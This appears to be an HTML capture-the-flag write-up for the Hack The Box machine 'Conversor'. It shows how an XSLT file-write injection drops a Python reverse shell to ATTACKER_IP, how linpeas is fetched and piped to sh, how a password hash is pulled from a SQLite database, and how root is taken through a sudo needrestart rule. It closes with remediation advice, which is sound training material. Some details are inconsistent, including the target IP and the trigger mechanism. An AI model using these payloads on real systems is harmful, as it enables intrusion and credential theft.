@@ -1,0 +1,850 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Write-up — Conversor.htb</title>
+  <meta name="description" content="Technical write-up of CTF conversor.htb — recon, fuzzing, exploitation, escalation.">
+</head>
+<style>
+/* style.css — Blog technique DARK MODE responsive */
+
+/* Variables */
+:root {
+  --max-width: 900px;
+  --bg: #0d1117;
+  --card: #161b22;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --accent-light: rgba(88,166,255,0.15);
+  --mono: "Fira Code", "SFMono-Regular", Menlo, Monaco, "Roboto Mono", monospace;
+  --radius: 10px;
+}
+
+/* Reset */
+* { box-sizing: border-box; }
+html, body { height: 100%; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+/* Layout wrapper */
+.container {
+  max-width: var(--max-width);
+  margin: 0 auto;
+  padding: 28px;
+}
+
+/* Header */
+.site-header {
+  background: #0d1117;
+  border-bottom: 1px solid #21262d;
+  padding: 18px 0;
+}
+.header-inner {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 16px;
+}
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+.brand h1 {
+  margin: 0;
+  font-size: 22px;
+  color: var(--accent);
+}
+.brand-content {
+  flex: 1;
+}
+.back-button {
+  padding: 8px 16px;
+  background: var(--accent);
+  color: var(--bg);
+  border-radius: 6px;
+  font-weight: 500;
+  transition: opacity 0.2s;
+  flex-shrink: 0;
+}
+.tagline {
+  margin: 4px 0 0;
+  font-size: 13px;
+  color: var(--muted);
+}
+.meta {
+  font-size: 13px;
+  color: var(--muted);
+  display: flex;
+  gap: 12px;
+}
+
+/* Article styling */
+.post {
+  background: var(--card);
+  border-radius: var(--radius);
+  padding: 28px;
+  margin-top: 22px;
+  box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+}
+
+.source-note {
+  font-size: 13px;
+  color: var(--muted);
+  margin-bottom: 12px;
+}
+
+section {
+  margin-top: 24px;
+}
+section h2 {
+  font-size: 20px;
+  margin-bottom: 8px;
+  color: var(--accent);
+}
+section p {
+  color: var(--text);
+}
+
+/* TOC */
+.toc {
+  margin: 18px 0;
+  padding: 14px;
+  background: #1c2128;
+  border-left: 4px solid var(--accent);
+  border-radius: 8px;
+}
+.toc h3 {
+  margin: 0 0 8px;
+  color: var(--accent);
+  font-size: 15px;
+}
+.toc ul {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+.toc li {
+  margin-bottom: 4px;
+}
+.toc a {
+  color: var(--text);
+  text-decoration: none;
+}
+.toc a:hover {
+  color: var(--accent);
+}
+
+/* Code & terminal blocks */
+.terminal {
+  background: #0b0f16;
+  color: #c9d1d9;
+  padding: 12px 14px;
+  border-radius: 8px;
+  margin: 12px 0;
+  font-family: var(--mono);
+  font-size: 13px;
+  overflow-x: auto;
+  border: 1px solid #21262d;
+  box-shadow: inset 0 0 12px rgba(0,0,0,0.4);
+}
+
+.cmd {
+  background: #1c2128;
+  border: 1px solid #30363d;
+  color: #e6edf3;
+  padding: 10px;
+  border-radius: 6px;
+  font-family: var(--mono);
+  font-size: 13px;
+  overflow-x: auto;
+}
+
+/* Inline code */
+code {
+  background: #1c2128;
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: #ffb86c;
+}
+
+/* Pre blocks */
+pre {
+  background: #0b0f16;
+  color: #c9d1d9;
+  padding: 12px;
+  border-radius: 8px;
+  overflow-x: auto;
+}
+
+/* Lists and quotes */
+ul {
+  margin: 8px 0 8px 18px;
+}
+blockquote {
+  margin: 16px 0;
+  padding: 12px 16px;
+  border-left: 4px solid var(--accent);
+  background: var(--accent-light);
+  color: var(--text);
+  border-radius: 6px;
+}
+
+/* Footer */
+.post-footer {
+  margin-top: 24px;
+  padding-top: 12px;
+  border-top: 1px solid #21262d;
+  color: var(--muted);
+}
+
+.site-footer {
+  text-align: center;
+  padding: 20px 0;
+  color: var(--muted);
+  font-size: 13px;
+  border-top: 1px solid #21262d;
+  background: #0d1117;
+}
+
+/* Links */
+a {
+  color: var(--accent);
+  text-decoration: none;
+}
+a:hover {
+  text-decoration: underline;
+}
+/* Simple single screenshot style (responsive, centered) */
+.single-shot {
+  margin: 18px 0 6px;
+  display: block;
+  text-align: center;
+}
+
+.single-shot img {
+  width: 100%;
+  max-width: 920px;      /* limite la largeur sur grand écran */
+  height: auto;
+  border-radius: 10px;
+  border: 1px solid rgba(255,255,255,0.04);
+  box-shadow: 0 10px 30px rgba(2,6,23,0.55);
+  background: #0b0f16;
+  object-fit: cover;
+}
+
+/* Caption styling */
+.single-shot figcaption {
+  margin-top: 8px;
+  font-size: 13px;
+  color: var(--muted);
+}
+/* Section explicative CVE (How it works) */
+.exploit-explain {
+  margin-top: 28px;
+  padding: 18px;
+  background: linear-gradient(180deg, rgba(88,166,255,0.02), transparent);
+  border-left: 4px solid var(--accent);
+  border-radius: 10px;
+  color: var(--text);
+}
+.exploit-explain h1 {
+  color: var(--accent);
+  margin-top: 0;
+}
+.exploit-explain h2 {
+  color: rgba(235, 138, 11, 0.925);
+  margin-top: 0;
+}
+
+.exploit-explain h3 {
+  color: var(--text);
+  margin-bottom: 6px;
+  margin-top: 12px;
+}
+
+.exploit-explain ul {
+  margin-left: 18px;
+  color: var(--text);
+}
+
+.exploit-explain .sources {
+  margin-top: 12px;
+  font-size: 13px;
+  color: var(--muted);
+}
+
+/* Back button and scroll to top */
+.back-button {
+  padding: 8px 16px;
+  background: var(--accent);
+  color: var(--bg);
+  border-radius: 6px;
+  font-weight: 500;
+  transition: opacity 0.2s;
+}
+
+.back-button:hover {
+  opacity: 0.9;
+  text-decoration: none;
+}
+
+.scroll-top {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;  /* Changed from left: 30px to right: 30px */
+  background: var(--accent);
+  color: var(--bg);
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.3s;
+  text-decoration: none;
+}
+
+.scroll-top.visible {
+  opacity: 1;
+}
+
+.scroll-top:hover {
+  opacity: 0.9;
+  text-decoration: none;
+}
+
+@media (max-width: 720px) {
+  .scroll-top {
+    bottom: 20px;
+    right: 20px;  /* Changed from left: 20px to right: 20px */
+    width: 40px;
+    height: 40px;
+  }
+}
+
+/* Smaller max-width on small screens so it doesn't feel huge */
+@media (max-width: 720px) {
+  .single-shot { margin: 14px 0; }
+  .single-shot img { max-width: 100%; border-radius: 8px; }
+  .single-shot figcaption { font-size: 12px; }
+}
+
+/* Responsive */
+@media (max-width: 720px) {
+  :root { --max-width: 680px; }
+  .container { padding: 18px; }
+  .post { padding: 20px; }
+  .header-inner { flex-direction: column; align-items: flex-start; }
+  .brand h1 { font-size: 20px; }
+  .toc { padding: 12px; }
+}
+
+
+</style>
+
+<body>
+    
+  <header class="site-header">
+    <div class="container header-inner">
+      <div class="brand">
+        <a href="index.html" class="back-button">← Back</a>
+        <div class="brand-content">
+          <h1>Conversor.htb — Write-up</h1>
+          <p class="tagline">Recon • Exploitation • Escalation — summary and commands</p>
+        </div>
+      </div>
+      <nav class="meta">
+        <time datetime="2025-10-22">Oct 27, 2025</time>
+        <span class="author">by <strong>Zed</strong></span>
+      </nav>
+    </div>
+  </header>
+  
+  <main class="container">
+    <article class="post">
+      <figure class="single-shot">
+            <img src="Conversor_picture.png" alt="shell.sh" loading="lazy">
+        </figure>
+
+      <section class="lead">
+        <h2>Summary</h2>
+        <p>This write-up describes an XSLT injection vulnerability and subsequent arbitrary code execution achieved via a privileged binary (related to CVE-2024-48990). 
+          It covers reconnaissance, exploitation, privilege escalation, and remediation recommendations </p>
+      </section>
+
+      <aside class="toc">
+        <h3>Contents</h3>
+        <ul>
+          <li><a href="#recon">Recon / nmap</a></li>
+          <li><a href="#Vulnerability-Analysis">Source Code Discovery</a></li>
+          <li><a href="#XSLT">Attacking XSLT</a></li>
+          <li><a href="#exploit">Exploitation</a></li>
+          <li><a href="#ssh">SSH on fismathack</a></li>
+          <li><a href="#root">Privilege Escalation</a></li>
+          <li><a href="#Conclusion and Remediation">Conclusion and Remediation</a></li>
+        </ul>
+      </aside>
+
+      <section id="recon">
+        <h2>Recon — nmap</h2>
+        <p>We performed a network scan using nmap to identify exposed services on 10.10.11.68</p>
+        <div class="terminal">
+<pre><code>PORT STATE SERVICE VERSION
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 11:31 EDT
+Nmap scan report for conversor.htb (10.10.11.92)
+Host is up (0.016s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
+|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-title: Login
+|_Requested resource was /login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
+
+</code></pre>
+        </div>
+        <p>Add the output on /etc/hosts</p>
+        <pre class="cmd"><code>10.10.11.92 conversor.htb</code></pre>
+      </section>
+
+      <p>Then we do a gobuster on the url</p>
+      <pre><code>
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://conversor.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 200) [Size: 2842]
+/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]                                                                    
+/login                (Status: 200) [Size: 722]
+/logout               (Status: 302) [Size: 199] [--> /login]
+/register             (Status: 200) [Size: 726]
+/server-status        (Status: 403) [Size: 278]
+Progress: 4746 / 4746 (100.00%)
+===============================================================
+Finished
+===============================================================</code></pre>
+
+        <p>The enumeration revealed three accessible pages: <code>/register</code>, <code>/login</code>, and <code>/about</code>.</p>
+
+        <figure class="single-shot">
+            <img src="1_conversor.png" alt="site after register and log on" loading="lazy">
+        </figure>
+         <p>And on the about page</p>
+         <figure class="single-shot">
+            <img src="13_conversor.png" alt="about page" loading="lazy">
+        </figure>
+        <p>As shown below we can download the source code</p>
+        <figure class="single-shot">
+            <img src="14_conversor.png" alt="tar file" loading="lazy">
+        </figure>
+      </secion>
+      
+      
+      <section id="source-code-discovery">
+        <h2>Source Code Discovery</h2>
+        
+        <p>Now we have repository and file on python</p>
+        <p>When we open install.md we can see an interesting things</p>
+<pre><code>
+If you want to run Python scripts (for example, our server deletes all files old...)
+***** www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f" ""</code></pre>
+        <p><code>*****</code>:This means “every minute, of every hour, of every day…”</p>
+        <p><code>www-data</code>: It runs as the www-data user.</p>
+        <p>It loops through every file ending in <code>.py</code> in the <code>/var/www/conversor.htb/scripts/</code> directory and executes it with python3</p>
+        <p>We then look for a potential file write vulnerability. We examine the /convert route</p>
+        <pre><code># A (hypothetical) snippet from app.py
+from lxml import etree
+...
+
+@app.route('/convert', methods=['POST'])
+def convert():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+        
+    xml_file = request.files['xml_file']
+    xslt_file = request.files['xslt_file']
+    
+    # ... code to save the files to an 'uploads' folder ...
+    xml_file.save(xml_path)
+    xslt_file.save(xslt_path)
+
+    try:
+        # --- THIS IS THE VULNERABILITY ---
+        # The app parses the user-supplied XSLT
+        xslt_root = etree.parse(xslt_path)
+        
+        # It then uses that XSLT to transform the XML
+        transform = etree.XSLT(xslt_root)
+        result = transform(etree.parse(xml_path))
+        # --- END VULNERABILITY ---
+        
+        return str(result)
+        
+    except Exception as e:
+        return str(e), 500</code></pre>
+          <p>The script identifies several vulnerabilty like Path travseral but the real vulnerabilty it's the <code>xslt_tree = etree.parse(xslt_path)</code> and <code>transform = etree.XSLT(xslt_tree)
+</code> and also <code>result_tree = transform(xml_tree)
+</code></p>
+
+</section>  
+  
+
+
+
+
+<section id="Vulnerability-Analysis">
+        <h2>Vulnerability Analysis — XSLT Injection</h2>
+
+  <section id="how-it-works" class="exploit-explain">
+  <h2>What is XSLT?</h2>
+  <p>
+    XSLT stands for <strong>Extensible Stylesheet Language — Transformations</strong>.  
+    It’s a declarative language expressed in XML, designed to transform XML documents into other formats — for example HTML, plain text, or another XML. Although it can look simple for formatting tasks, XSLT is actually very powerful and can be used like a programming language.
+  </p>
+
+  <p>
+    <strong>libxml2</strong> is the widely used C library for XML parsing and XSLT processing. In Python, the <code>lxml</code> module relies on libxml2 to provide fast, feature-rich XML/XSLT handling.
+  </p>
+
+  <p>
+    <strong>EXSLT</strong> refers to a set of non-standard extensions that add convenient functions to XSLT (string handling, date/time helpers, etc.). These extensions extend the transformer’s capabilities beyond core XSLT.
+  </p>
+
+  <p>
+    <strong>The risk</strong>: some extensions expose input/output (I/O) operations — for example the ability to read or write external resources. If an application accepts and executes XSLT stylesheets supplied by untrusted users, an unrestricted XSLT processor can unintentionally perform local reads or writes. In short, executing untrusted XSLT can lead to information disclosure or file creation/modification if the XSLT engine and filesystem permissions allow it.
+  </p>
+</section>
+
+
+
+        <p>After creating a user on the site, we can log in and find some information</p>
+        <p>We can see a Download Templates section</p>
+<pre class="cmd"><code>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:output method="html" indent="yes" /&gt;
+  &lt;xsl:template match="/"&gt;
+    &lt;html&gt;
+      &lt;head&gt;&lt;title&gt;Nmap Scan Results&lt;/title&gt;&lt;/head&gt;
+      &lt;body&gt;
+        &lt;h1&gt;Nmap Scan Report&lt;/h1&gt;
+        &lt;h3&gt;&lt;xsl:value-of select="nmaprun/@args"/&gt;&lt;/h3&gt;
+        &lt;xsl:for-each select="nmaprun/host"&gt;
+          &lt;div class="card"&gt;
+            &lt;div class="host-header"&gt;
+              Host: &lt;span class="ip"&gt;&lt;xsl:value-of select="address[@addrtype='ipv4']/@addr"/&gt;&lt;/span&gt;
+            &lt;/div&gt;
+            &lt;!-- etc --&gt;
+          &lt;/div&gt;
+        &lt;/xsl:for-each&gt;
+      &lt;/body&gt;
+    &lt;/html&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+
+
+        <p>Version information</p>
+
+
+        <figure class="single-shot">
+            <img src="1_2conversor.png" alt="Attacking XSLT in Web Applications" loading="lazy">
+        </figure>
+
+        <p style="margin: 20px; color: #2196F3; text-align: center;">
+            Resources referenced during exploitation:<br>
+            <a href="https://adipsharif.medium.com/attacking-xslt-in-web-applications-ea538a8fb9d0" style="color: #2196F3; text-decoration: underline;">https://adipsharif.medium.com/attacking-xslt-in-web-applications-ea538a8fb9d0</a><br>
+            <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection" style="color: #2196F3; text-decoration: underline;">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection</a>
+        </p>
+
+
+        <div class="terminal">
+<pre><code>┌──(kali㉿kali)-[~]
+?xml version="1.0" encoding="UTF-8"?>
+html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+body>
+br />Version: xsl:value-of select="system-property('xsl:version')" />
+br />Vendor: xsl:value-of select="system-property('xsl:vendor')" />
+br />Vendor URL: xsl:value-of select="system-property('xsl:vendor-url')" />
+/body>
+/html>
+</code></pre>
+        </div>
+</section>
+
+      <section id="XSLT">
+        <h2>Attacking XSLT in Web Applications</h2>
+        <h3>We craft a malicious XSLT template using the EXSLT <code>document() </code>extension to write a reverse shell Python script to the <code>/scripts/</code> directory:</h3>
+        <div class="terminal">
+<pre class="cmd"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:exslt="http://exslt.org/common"
+                extension-element-prefixes="exslt"
+                version="1.0"&gt;
+
+  &lt;xsl:template match="/"&gt;
+    &lt;exslt:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
+import socket,subprocess,os
+s=socket.socket()
+s.connect(("ATTACKER_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+    &lt;/exslt:document&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+       </div>
+       <p>Once uploaded and processed by the web application, the script is created and executed automatically by the periodic cron job granting us a reverse shell as <code>www-data</code>.</p>
+          <ul>
+          <li>The file is an XSLT stylesheet. I executed it using the server-side XSLT processor (libxslt via lxml in this case).</li>
+          <li>The element <ptswarm:document href="…">…</ptswarm:document> is an extension exposed by the engine/platform. It instructs the processor to write the content placed between the tags into the file specified by the href attribute.</li>
+          <li>Here, <code>href="/var/www/conversor.htb/scripts/shell.py"</code> targets an absolute path within the application's directory structure. If the XSLT engine supports this extension and the process running the transformation has write permissions on that path, then the engine will create a shell.py file containing the text I placed between the tags.</li>
+          <li>The written content is a Python script that, when executed, initiates an outbound TCP connection to a specified IP/port (reverse-connect), duplicates file descriptors, and launches an interactive shell <code>(/bin/sh -i)</code>. In other words, the file contains code designed to obtain remote shell access if executed by a process on the target machine.</li>
+        </ul>
+        <p><strong>In summary:</strong> I used XSLT to exploit a write extension and drop an arbitrary script onto the file system. If a mechanism on the server (cron job, service, automatic include, etc.) executes that script, I would gain shell access to the machine. The root cause is the execution of an untrusted XSLT combined with an exposed I/O primitive in the engine.</p>
+ 
+       <figure class="single-shot">
+            <img src="2_conversor.png" alt="picture of sit after upload the file" loading="lazy">
+        </figure>
+        <p>Now we need to launch <code>nc -lnvp 4444</code></p>
+        <p>Finally, clicking the upload link triggers the payload execution</p>
+
+        <figure class="single-shot">
+            <img src="3_conversor.png" alt="picture of site after clicking on the link" loading="lazy">
+        </figure>
+        </section>
+
+
+        <section id="how-it-works" class="exploit-explain">
+  <h2>? How it’s work — RCE via XSLT (file write → execution)</h2>
+  <p>The application accepts XSLT templates and performs server-side transformations using a provided XML input. By abusing the EXSLT <code>document</code> extension, 
+    I was able to write an arbitrary script to a web-executable directory <code>(/var/www/conversor.htb/scripts/shell.py)</code></p>
+  <p>By requesting the corresponding URL <code>(HTTP GET /scripts/shell.py)</code>, the server executed the script, which opened a connection back to the attacker. 
+    This chain demonstrates remote code execution (RCE) via an unfiltered XSLT template upload.</p>
+     
+    <p>PoC (brief steps to include right after the paragraph)</p>
+    <ul>
+        <li>Upload malicious XSLT <code>(xsploit.xslt)</code> that writes <code>/var/www/conversor.htb/scripts/shell.py</code> using EXSLT document.</li>
+        <li>Provide a minimal XML input (e.g. nmaprun) required by the application.</li>
+        <li>Trigger execution by requesting the script: <code>curl -s http://conversor.htb/scripts/shell.py</code> while running a listener on the attacker machine: <code>nc -lvnp 4444.</code></li>
+    </ul>
+</section>
+
+
+      <section id="exploit">
+        <h3>Exploitation — XSLT Injection</h3>
+        <p>We successfully obtained a reverse shell as www-data./p>
+        <figure class="single-shot">
+            <img src="4_5conversor.png" alt="nc on www-data" loading="lazy">
+        </figure>
+
+        <p>Now we will run linpeas on this user to find vulnerabilities or misconfigurations for privilege escalation</p>
+        <p>Don't forget to launch a HTTP server on your attacker machine</p>
+        <pre class="cmd"><code>sudo python3 -m http.server 80</code></pre>
+        <p>Then we launch linpeas on the target machine</p>
+        <pre class="cmd"><code>curl http://IP_ATTACKER:80/linpeas.sh | sh</code></pre>
+        <p>The linpeas result is very noisy, but we found some interesting things</p>
+        <figure class="single-shot">
+            <img src="4_conversor.png" alt="result sql" loading="lazy">
+        </figure>
+        <p>We found <code>users.db</code> and user <code>fismathack</code></p>
+        <p>Next, we attempt to retrieve stored credentials.</p>
+        <figure class="single-shot">
+            <img src="5_conversor.png" alt="cat sql" loading="lazy">
+        </figure>
+        <p></p>
+        <pre class="cmd"><code>strings -n 6 /var/www/conversor.htb/instance/users.db > /tmp/users_strings.txt</code></pre>
+        <pre class="cmd"><code>less /tmp/users_strings.txt</code></pre>
+        <figure class="single-shot">
+            <img src="6_conversor.png" alt="string sql" loading="lazy">
+        </figure>
+        <p></p>
+        <pre class="cmd"><code>sqlite3 /var/www/conversor.htb/instance/users.db "select id,username,password from users;"</code></pre>
+        <figure class="single-shot">
+            <img src="7_conversor.png" alt="sqlite3" loading="lazy">
+        </figure>
+        <p>After extensive enumeration, I found the hash for <code>fismathack</code></p>
+        <p>Now we will crack this hash offline</p>
+        <figure class="single-shot">
+            <img src="8_conversor.png" alt="sqlite3" loading="lazy">
+        </figure>
+        <figure class="single-shot">
+            <img src="9_conversor.png" alt="sqlite3" loading="lazy">
+        </figure>
+        <p>Now that we have the credentials for <code>fismathack</code>, we will connect via SSH to gain stable access and attempt privilege escalation</p>
+
+
+      </section>
+
+
+
+
+
+
+
+
+
+      <section id="ssh">
+        <h2>SSH on fismathack</h2>
+        <figure class="single-shot">
+            <img src="10_conversor.png" alt="rev-shell" loading="lazy">
+        </figure>
+        <p>Now we are connected to the user fismathack and have take user.txt</p>
+        
+      </section>
+
+
+
+
+
+
+
+
+      <section id="root">
+        <h2>Privilege Escalation</h2>
+        <p>Then I try to find privilege escalation opportunities with simple commands like:</p>
+        <pre class="cmd"><code>sudo -l</code></pre>
+        <figure class="single-shot">
+            <img src="11_conversor.png" alt="needrestart" loading="lazy">
+        </figure>
+
+        <p>We have special rights with needrestart</p>
+      </section>
+      <section id="What i tried first" class="exploit-explain">
+      <h2>What I tried first</h2>
+      <p>After trying to exploit CVE-2024-48990, I failed several times using these two exploit PoCs</p>
+
+      <p style="margin: 20px; color: #2196F3; text-align: center;">
+            Resources exploits used:<br>
+            <a href="https://github.com/ally-petitt/CVE-2024-48990-Exploit" style="color: #2196F3; text-decoration: underline;">https://github.com/ally-petitt/CVE-2024-48990-Exploit</a><br>
+            <a href="https://github.com/makuga01/CVE-2024-48990-PoC" style="color: #2196F3; text-decoration: underline;">https://github.com/makuga01/CVE-2024-48990-PoC</a>
+      </p>
+      </section>
+
+      
+        <h3>Final Exploit needrestart - Arbitrary code execution via configuration file</h3>
+        <p><code>sudo -l</code> shows : <code>(ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code> → You can run needrestart as root without a password.</p>
+        <p>The execution of <code>sudo /usr/sbin/needrestart -c test.conf </code>executes the contents of test.conf with root privileges, hence <code>system("cat /root/root.txt");</code> 
+          which returns the root file.</p>
+         <figure class="single-shot">
+            <img src="12_conversor.png" alt="needrestart" loading="lazy">
+        </figure>
+        <p>At this point, we have obtained root.txt, completing the compromise of the Conversor host</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      <section id="Conclusion and Remediation">
+  <h2>Conclusion & recommendations</h2>
+
+  <h3>Conclusion</h3>
+  <p>
+    Combining an XSLT injection that allowed arbitrary file writes with a misconfigured sudo rule for
+    <code>/usr/sbin/needrestart</code> resulted in full compromise of the host (root). The XSLT processor was able to write a script
+    to a web-executable directory, and the overly permissive sudo rule allowed privileged execution paths to be abused.
+  </p>
+
+  <h3>Immediate remediation (short term)</h3>
+  <ul>
+    <li><strong>Remove the NOPASSWD rule</strong> for <code>/usr/sbin/needrestart</code> from <code>/etc/sudoers</code> (edit with <code>visudo</code>).</li>
+    <li><strong>Require authentication</strong> for any sudo invocation of that binary (do NOT leave it as NOPASSWD).</li>
+    <li><strong>Restrict allowed sudo arguments</strong> if the command must remain usable: specify the exact command and permitted arguments in <code>/etc/sudoers</code> rather than allowing all arguments. Example:
+      <pre><code># allow only a specific safe invocation
+fismathack ALL=(root) /usr/sbin/needrestart --check-only
+      </code></pre>
+      (Use <code>visudo</code> to implement carefully.)
+    </li>
+    <li><strong>Remove execute permissions</strong> from web-upload directories or prevent the webserver from executing files in upload/script folders (make upload directories non-executable).</li>
+    <li><strong>Revoke or rotate any sensitive artifacts</strong> (secrets, keys) that may have been exposed during testing and redact attacker IPs before publishing logs.</li>
+  </ul>
+
+  <h3>Longer-term fixes (medium / long term)</h3>
+  <ul>
+    <li><strong>Disable or restrict XSLT extensions</strong> such as EXSLT in the server XSLT processor unless explicitly needed. Configure the processor to disallow extension elements that can write files or execute code.</li>
+    <li><strong>Run XSLT transformations in a hardened sandbox</strong> (container, chroot or separate low-privilege user) with minimal filesystem and network access.</li>
+    <li><strong>Apply least privilege to services:</strong> the web server and any transformation processes must run under a dedicated, non-privileged account and must not be able to write to executable web directories.</li>
+    <li><strong>Harden file system layout:</strong> mount web content directories with options that reduce risk (e.g. <code>noexec</code> where appropriate), and deny write access to directories served as executable content.</li>
+    <li><strong>Use Mandatory Access Control:</strong> enforce AppArmor / SELinux profiles to prevent unexpected file writes or execution by the XSLT processor.</li>
+    <li><strong>Input validation & upload scanning:</strong> validate and sanitize uploaded templates; restrict allowed MIME types; scan uploads for suspicious payloads and block them.</li>
+    <li><strong>Monitoring and alerting:</strong> add detections for unexpected file creations in web directories, unusual sudo invocations, and outbound connections from the web process. Centralize logs and alert on anomalies.</li>
+    <li><strong>Secure deployment practices:</strong> keep <code>needrestart</code> and related packages updated; review and patch third-party tools that accept user-controlled configuration files. Periodically audit <code>/etc/sudoers</code> for overly-permissive rules.</li>
+    <li><strong>Use a command wrapper where needed:</strong> if an administrative tool must be callable by non-admins, consider implementing a small wrapper that validates inputs and runs the real binary with tightly controlled arguments (instead of giving direct sudo access to the binary).</li>
+    <li><strong>Regular security reviews:</strong> include sudoers and upload/transform features in regular security audits and pentests.</li>
+  </ul>
+
+  <h3>Short, actionable checklist</h3>
+  <ul>
+    <li>Run <code>visudo</code> and remove or restrict the <code>NOPASSWD</code> entry for <code>/usr/sbin/needrestart</code>.</li>
+    <li>Make upload directories non-executable and set proper ownership/permissions (e.g. owned by a non-exec user, mode <code>750/640</code> where appropriate).</li>
+    <li>Configure XSLT processor to disallow extension elements or run it with a restricted configuration profile.</li>
+    <li>Deploy file creation alerts on web directories and log sudo executions.</li>
+  </ul>
+</section>
+
+    </article>
+  </main>
+
+  <a href="#" class="scroll-top" title="Scroll to top">↑</a>
+
+  <footer class="site-footer">
+    <div class="container">
+      <p>write-up — hack the box · conversor · zed</p>
+    </div>
+  </footer>
+
+  <script>
+    // Show/hide scroll to top button
+    const scrollTop = document.querySelector('.scroll-top');
+    window.addEventListener('scroll', () => {
+      if (window.pageYOffset > 400) {
+        scrollTop.classList.add('visible');
+      } else {
+        scrollTop.classList.remove('visible');
+      }
+    });
+  </script>
+</body>
+</html>
